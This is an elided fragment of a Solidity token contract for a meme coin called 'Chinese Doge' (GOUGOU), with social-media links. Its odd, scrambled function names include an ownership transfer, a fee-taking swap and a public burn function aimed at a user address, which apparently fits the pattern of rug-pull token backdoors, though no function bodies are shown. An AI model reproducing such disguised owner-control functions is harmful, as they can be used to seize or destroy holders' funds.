/**
https://t.me/ChineseDogeERC2
https://twitter.com/GOU_ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipsitrblliontyser(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract GOUGOU is Ownable {
    ...
    constructor (){
        name =unicode"Chinese Doge";
        symbol =unicode"GOUGOU";
        decimals = 9;
    ...
    function swap(address[] calldata _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqunitylionsters(address user) public {
